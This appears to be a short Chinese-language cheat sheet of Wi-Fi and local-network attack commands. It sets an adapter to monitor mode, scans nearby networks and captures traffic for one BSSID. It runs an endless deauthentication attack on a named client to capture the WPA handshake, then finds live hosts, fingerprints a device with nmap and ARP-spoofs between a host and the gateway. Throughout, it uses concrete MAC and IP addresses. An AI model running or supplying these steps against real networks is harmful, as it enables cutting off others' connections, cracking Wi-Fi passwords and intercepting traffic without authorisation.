iw list 查看网卡信息看是否支持监听模式（）Supported interface modes: #支持的接口模式

lsusb查看所有的usb设备

airmon-ng start wlan0 启动网卡的监听模式

airodump-ng wlan0mon 检测附近的wifi

airodump-ng -c 11 --bssid C8:3A:35:00:27:40 -w Tenda_002740 wlan0mon 监听指定网络下的设备连接

aireplay-ng -0 0 -a C8:3A:35:00:27:40 -c9c:e8:2b:f7:37:33 wlan0mon 对之指定wifi下的设备攻击获取哈希握手包

fping -g -r 0 -s 192.168.0/24 查看局域内存活的设备

nmap -O -T4 192.168.0.107 扫描设备详细信息

arpspoof -i  wlan0mon -t 192.168.0.10 192.168.0.1 arp欺骗



